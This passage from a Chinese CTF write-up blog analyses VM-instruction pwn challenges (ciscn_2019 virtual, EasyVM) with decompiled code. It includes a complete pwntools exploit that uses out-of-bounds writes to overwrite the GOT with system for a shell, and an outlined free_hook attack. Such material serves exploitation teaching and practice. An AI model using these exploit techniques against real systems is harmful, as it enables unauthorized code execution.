-36</span></span><br><span class="line">payload+=<span class="string">"\x06"</span>                <span class="comment">#halt</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h3><p>来源：<a href="https://github.com/Dittozzz/ctf-pwn-writeup/tree/master/ciscn-2019/Virtual" target="_blank" rel="noopener">ciscn_2019_初赛_virtual</a></p>
<p>checksec</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/mnt/hgfs/shared/vmpwn/ciscn_2019_c_virtual/pwn&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<h4 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h4><p>这道题相对上一道题复杂了许多，首先弄清楚程序逻辑</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *exec_name; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  section_info *stack_addr; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  section_info *text_addr; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">void</span> **data_addr; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">char</span> *ptr; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  do_init();</span><br><span class="line">  exec_name = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);  <span class="comment">//name存放在堆上</span></span><br><span class="line">  stack_addr = sub_4013B4(<span class="number">64</span>);          <span class="comment">//模拟栈，存放栈数据</span></span><br><span class="line">  text_addr = sub_4013B4(<span class="number">128</span>);          <span class="comment">//模拟代码段，存放指令</span></span><br><span class="line">  data_addr = (<span class="keyword">void</span> **)sub_4013B4(<span class="number">64</span>);  <span class="comment">//模拟数据段，存放数据</span></span><br><span class="line">  ptr = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x400</span>uLL);       <span class="comment">//存放临时数据，有点cache的味道 </span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Your program name:"</span>);</span><br><span class="line">  my_read_((__int64)exec_name, <span class="number">0x20</span>u);  <span class="comment">//直接写数据到name处</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Your instruction:"</span>);</span><br><span class="line">  my_read_((__int64)ptr, <span class="number">0x400</span>u);       <span class="comment">//先写到cache中</span></span><br><span class="line">  StoreOpcode(text_addr, ptr);          <span class="comment">//再存入代码段</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Your stack data:"</span>);</span><br><span class="line">  my_read_((__int64)ptr, <span class="number">0x400</span>u);       <span class="comment">//先写到cache中</span></span><br><span class="line">  StroeStack(stack_addr, ptr);          <span class="comment">//再存入栈中</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)run((__int64)text_addr) )   <span class="comment">//模拟执行</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"-------"</span>);  </span><br><span class="line">    <span class="built_in">puts</span>(exec_name);                             <span class="comment">//打印name</span></span><br><span class="line">    puts_stack(stack_addr);                      <span class="comment">//打印栈数据</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"-------"</span>); </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Your Program Crash :)"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">  my_free((<span class="keyword">void</span> **)text_addr);</span><br><span class="line">  my_free((<span class="keyword">void</span> **)stack_addr);</span><br><span class="line">  my_free(data_addr);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果只看上面，大概可以想到：</p>
<p>1、name = ”/bin/sh\x00”, 利用漏洞将puts@got改成system地址</p>
<p>2、打印栈数据可以泄露一些地址</p>
<p>下面来看一下stack、text、data是如何存放数据的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">section_info *__<span class="function">fastcall <span class="title">sub_4013B4</span><span class="params">(<span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  section_info *result; <span class="comment">// rax</span></span><br><span class="line">  section_info *ptr; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">void</span> *s; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  ptr = (section_info *)<span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);   <span class="comment">//存放结构体</span></span><br><span class="line">  <span class="keyword">if</span> ( !ptr )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  s = <span class="built_in">malloc</span>(<span class="number">8L</span>L * size);    <span class="comment">//存放数据</span></span><br><span class="line">  <span class="keyword">if</span> ( s )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">8L</span>L * size);</span><br><span class="line">    ptr-&gt;section_ptr = (__int64)s;</span><br><span class="line">    ptr-&gt;size = size;     </span><br><span class="line">    ptr-&gt;numb = <span class="number">-1</span>;</span><br><span class="line">    result = ptr;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结构体如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">00000000 section_info    struc ; (sizeof=0x10, mappedto_6)</span><br><span class="line">00000000 section_ptr     dq ?</span><br><span class="line">00000008 size            dd ?</span><br><span class="line">0000000C idx             dd ?</span><br><span class="line">00000010 section_info    ends</span><br></pre></td></tr></table></figure>
<p>下面再看一下两个操作数据的函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 __fastcall Get(section_info *text_addr, _QWORD *a2)</span><br><span class="line">&#123;</span><br><span class="line">  if ( !text_addr )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( text_addr-&gt;numb == -1 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  *a2 = *(_QWORD *)(text_addr-&gt;section_ptr + 8LL * text_addr-&gt;numb--);</span><br><span class="line">  return 1LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Get(addr, a): 从addr从取数据到a中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 __fastcall StoreInSection(section_info *a1, __int64 data)</span><br><span class="line">&#123;</span><br><span class="line">  int idx; // [rsp+1Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  if ( !a1 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  idx = a1-&gt;numb + 1;                          </span><br><span class="line">  if ( idx == a1-&gt;size )</span><br><span class="line">    return 0LL;</span><br><span class="line">  *(_QWORD *)(a1-&gt;section_ptr + 8LL * idx) = data;</span><br><span class="line">  a1-&gt;numb = idx;</span><br><span class="line">  return 1LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>StoreInSection(a1, data)：将data存放到a中</p>
<h4 id="指令功能"><a href="#指令功能" class="headerlink" title="指令功能"></a>指令功能</h4><p>共有7个指令：push、pop、add、sub、mul、div、load、save</p>
<p>push：从stack_addr中取出数据放进data_addr中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __<span class="function">fastcall <span class="title">do_PUSH</span><span class="params">(section_info *data_addr, section_info *stack_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)Get(stack_addr, &amp;v3) &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)StoreInSection(data_addr, v3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>pop：从data_addr中取出数据放进stack_addr中，与push刚好相反</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __<span class="function">fastcall <span class="title">do_POP</span><span class="params">(section_info *data_addr, section_info *stack_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)Get(data_addr, &amp;v3) &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)StoreInSection(stack_addr, v3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>add：从data_addr中取出两个数据相加再存入data_addr；sub、mul、div类似</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">do_ADD</span><span class="params">(section_info *data_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)Get(data_addr, &amp;v2) &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)Get(data_addr, &amp;v3) )</span><br><span class="line">    result = StoreInSection(data_addr, v3 + v2);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>load：从data_addr中取出数据作为data_addr的索引，再将该索引指向的数据存放到data_addr中，由于没有进行索引的判断，因此可以造成越界读</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">do_LOAD</span><span class="params">(section_info *data_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 idx; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)Get(data_addr, &amp;idx) )</span><br><span class="line">    result = StoreInSection(data_addr, *(_QWORD *)(data_addr-&gt;section_ptr + <span class="number">8</span> * (data_addr-&gt;numb + idx)));</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>save：从data_addr中取出两个数据，将第二个数据写入第一个数据相关的索引中，存在越界写。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">do_SAVE</span><span class="params">(section_info *data_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  __int64 value; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)Get(data_addr, &amp;v2) || !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)Get(data_addr, &amp;value) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  *(_QWORD *)(<span class="number">8</span> * (data_addr-&gt;numb + v2) + data_addr-&gt;section_ptr) = value;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>例如：利用save将data_addr覆盖成0x400</p>
<p><img alt="" data-src="/2020/04/10/虚拟指令集pwn/1.png" class="lazyload"></p>
<p>利用思路：</p>
<p>1、先把got表写入data_addr-&gt;section_ptr处：push got_addr；push -3；save</p>
<p>2、load put@got，加上它与system@got的偏移：push 5；load；push offset；add</p>
<p>3、将该地址写入put@got的地址处：push 5；save</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">p = process(<span class="string">'./pwn'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gd</span><span class="params">(s=<span class="string">''</span>)</span>:</span></span><br><span class="line">    gdb.attach(p,s)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'name:\n'</span>,<span class="string">'/bin/sh'</span>)</span><br><span class="line">ins = <span class="string">"push push save push load push add push save"</span></span><br><span class="line">p.sendlineafter(<span class="string">'instruction:\n'</span>, ins)</span><br><span class="line"></span><br><span class="line">offset = -(libc.sym[<span class="string">'puts'</span>] - libc.sym[<span class="string">'system'</span>])</span><br><span class="line">got_addr = <span class="number">0x404000</span></span><br><span class="line">data = [got_addr,<span class="number">-3</span>,<span class="number">5</span> ,offset ,<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    payload+=str(i)+<span class="string">" "</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gd('b *0x401A75\nb *0x4019C7\nb*0x401A5D\n')</span></span><br><span class="line">p.sendlineafter(<span class="string">'data:\n'</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="例题3"><a href="#例题3" class="headerlink" title="例题3"></a>例题3</h3><p>来源：<a href="https://adworld.xctf.org.cn/media/uploads/task/f73efe174bb6478781a72677aea0235d.zip" target="_blank" rel="noopener">gxzyCTF-EasyVM</a></p>
<p>checksec</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/mnt/hgfs/shared/vmpwn/easyVM/attachment/EasyVM&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<h4 id="程序逻辑-1"><a href="#程序逻辑-1" class="headerlink" title="程序逻辑"></a>程序逻辑</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *buf; <span class="comment">// ST2C_4</span></span><br><span class="line">  _DWORD *ptr; <span class="comment">// [esp+18h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+ACh] [ebp+7Ch]</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  ptr = sub_DD5();    <span class="comment">//定义一些寄存器</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( menu() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:                    </span><br><span class="line">        buf = <span class="built_in">malloc</span>(<span class="number">0x300</span>u); </span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">0x2FF</span>u);  <span class="comment">//读入指令</span></span><br><span class="line">        ptr[<span class="number">8</span>] = buf;          <span class="comment">//地址存放在ptr[8]中</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> ( !ptr )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        vm(ptr);               <span class="comment">//定义了指令集</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> ( !ptr )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">free</span>((<span class="keyword">void</span> *)ptr[<span class="number">10</span>]);</span><br><span class="line">        <span class="built_in">free</span>(ptr);             <span class="comment">//有点东西</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Maybe a bug is a gif?"</span>);</span><br><span class="line">        dword_305C = v5;       <span class="comment">//程序的地址</span></span><br><span class="line">        ptr[<span class="number">8</span>] = &amp;unk_3020;    <span class="comment">//存入一些指令</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Zzzzzz........"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Are you kidding me ?"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看到case 3，大概可以想到要把free(ptr)修改成system(“/bin/sh”)</p>
<p>先来看指令集，指令集只是定义了一些运算，下面介绍几个主要的</p>
<p>0x80：以下一个指令为索引idx，把下2到5个字节为值传入寄存器a1[idx]</p>
<p>例如：’\x80\x02\x00\x96\xF3\x78’就是a1[2] = 0x78F39600</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">0x80</span>u )</span><br><span class="line">&#123;</span><br><span class="line">  a1[sub_9C3((<span class="keyword">int</span>)a1, <span class="number">1u</span>)] = *(_DWORD *)(a1[<span class="number">8</span>] + <span class="number">2</span>);</span><br><span class="line">  a1[<span class="number">8</span>] += <span class="number">6</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>0x09与0x11：把dword_305C中的值打印出来</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">9</span> )</span><br><span class="line">&#123;</span><br><span class="line">  a1[<span class="number">1</span>] = dword_305C;</span><br><span class="line">  ++a1[<span class="number">8</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">0x11</span> )              </span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, a1[<span class="number">1</span>]);</span><br><span class="line">  ++a1[<span class="number">8</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>0x53与0x54: 输出一个字节和输入一个字节</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">0x53</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">putchar</span>(*(<span class="keyword">char</span> *)a1[<span class="number">3</span>]);</span><br><span class="line">  a1[<span class="number">8</span>] += <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">0x54</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v1 = (_BYTE *)a1[<span class="number">3</span>];</span><br><span class="line">  *v1 = getchar();</span><br><span class="line">  a1[<span class="number">8</span>] += <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>0x71接0x76：相当于a1[3] = <em>(_DWORD </em>)(a1[8] + 1);</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">0x71</span> )</span><br><span class="line">&#123;</span><br><span class="line">  a1[<span class="number">6</span>] -= <span class="number">4</span>;</span><br><span class="line">  *(_DWORD *)a1[<span class="number">6</span>] = *(_DWORD *)(a1[<span class="number">8</span>] + <span class="number">1</span>);</span><br><span class="line">  a1[<span class="number">8</span>] += <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">0x76</span> )</span><br><span class="line">&#123;</span><br><span class="line">  a1[<span class="number">3</span>] = *(_DWORD *)a1[<span class="number">6</span>];</span><br><span class="line">  *(_DWORD *)a1[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">  a1[<span class="number">6</span>] += <span class="number">4</span>;</span><br><span class="line">  a1[<span class="number">8</span>] += <span class="number">5</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其实弄清楚&amp;unk_3020中的指令就差不多了，该指令首先给dword_305C赋值，然后对该值进行一系列运算并打印出来，根据该运算特征可以发现是MT19937随机数算法，可以利用Z3约束器进行求解（参考<a href="http://ctf.njupt.edu.cn/382.html#EasyVM）" target="_blank" rel="noopener">http://ctf.njupt.edu.cn/382.html#EasyVM）</a></p>
<p>实际上可以不用管这个密文，我们只需要dword_305C已经赋值，然后运行<code>&quot;\x09\x11\x99&quot;</code>即可</p>
<p>这道题可以有多种方法构造任意地址读写</p>
<p>1、利用<code>&quot;\x80\x03&quot;</code></p>
<p>2、利用<code>&quot;\x71\x76&quot;</code></p>
<p>具体攻击方法如下：</p>
<p>1、泄露程序基址，得到malloc@got地址</p>
<p>2、泄露malloc的地址，得到libc基址，从而计算free_hook地址和system地址</p>
<p>3、将”/bin/sh\x00”写入ptr，将system@addr写入free_hook</p>
<p>4、case 3 getshell</p>
<p>完整exp</p>
